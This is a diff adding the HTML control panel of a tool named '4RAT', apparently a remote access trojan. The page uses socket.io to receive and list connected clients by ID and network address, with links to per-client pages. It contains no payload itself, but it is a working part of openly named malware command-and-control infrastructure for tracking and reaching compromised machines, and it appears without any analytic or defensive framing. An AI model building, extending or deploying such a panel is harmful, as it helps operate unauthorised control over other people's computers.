@@ -1,0 +1,141 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>4RAT</title>
+    <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
+    <style>
+        @keyframes rainbow {
+            100%, 0% {
+                color: rgb(255, 0, 0);
+            }
+            8% {
+                color: rgb(255, 127, 0);
+            }
+            16% {
+                color: rgb(255, 255, 0);
+            }
+            25% {
+                color: rgb(127, 255, 0);
+            }
+            33% {
+                color: rgb(0, 255, 0);
+            }
+            41% {
+                color: rgb(0, 255, 127);
+            }
+            50% {
+                color: rgb(0, 255, 255);
+            }
+            58% {
+                color: rgb(0, 127, 255);
+            }
+            66% {
+                color: rgb(0, 0, 255);
+            }
+            75% {
+                color: rgb(127, 0, 255);
+            }
+            83% {
+                color: rgb(255, 0, 255);
+            }
+            91% {
+                color: rgb(255, 0, 127);
+            }
+        }
+
+        body {
+            background-color: black;
+            color: white;
+            font-family: "JetBrains Mono", monospace;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        h1,
+        h2 {
+            text-align: center;
+        }
+
+        #title {
+            margin-bottom: 20px;
+        }
+
+        #burger-menu {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            cursor: pointer;
+            font-size: 24px;
+        }
+
+        #clients-menu {
+            position: absolute;
+            top: 50px;
+            left: 10px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid white;
+            border-radius: 5px;
+            padding: 10px;
+            display: none;
+            flex-direction: column;
+            transition: all 0.3s ease-in-out;
+            z-index: 10;
+        }
+
+        .client-item {
+            padding: 10px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .client-item:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+
+        #output {
+            white-space: pre-wrap;
+            border: 1px solid white;
+            padding: 10px;
+            border-radius: 5px;
+            background-color: rgba(255, 255, 255, 0.1);
+            margin: 20px;
+        }
+
+        #ra {
+            animation: rainbow 2s .5s infinite ease-in;
+        }
+    </style>
+</head>
+
+<body>
+    <h1 id="title"><span id="ra">4</span>RAT Control Panel</h1>
+    <div id="burger-menu">&#9776;</div>
+    <div id="clients-menu"></div>
+    <h2>Connected Clients</h2>
+
+    <script>
+        const socket = io();
+        const clientsMenu = document.getElementById('clients-menu');
+
+        // Toggle the burger menu
+        document.getElementById('burger-menu').onclick = () => {
+            clientsMenu.style.display = clientsMenu.style.display === 'none' || clientsMenu.style.display === '' ? 'flex' : 'none';
+        };
+
+        socket.on('client_update', (data) => {
+            clientsMenu.innerHTML = ''; // Clear previous client list
+            data.clients.forEach((client) => {
+                const clientItem = document.createElement('div');
+                clientItem.className = 'client-item';
+                clientItem.innerHTML = `<a href="/client/${client.id}" style="color: white; text-decoration: none;">ID: ${client.id}, Address: ${client.address}</a>`;
+                clientsMenu.appendChild(clientItem);
+            });
+            clientsMenu.style.display = 'flex'; // Show menu when updated
+        });
+    </script>
+</body>
+
+</html>
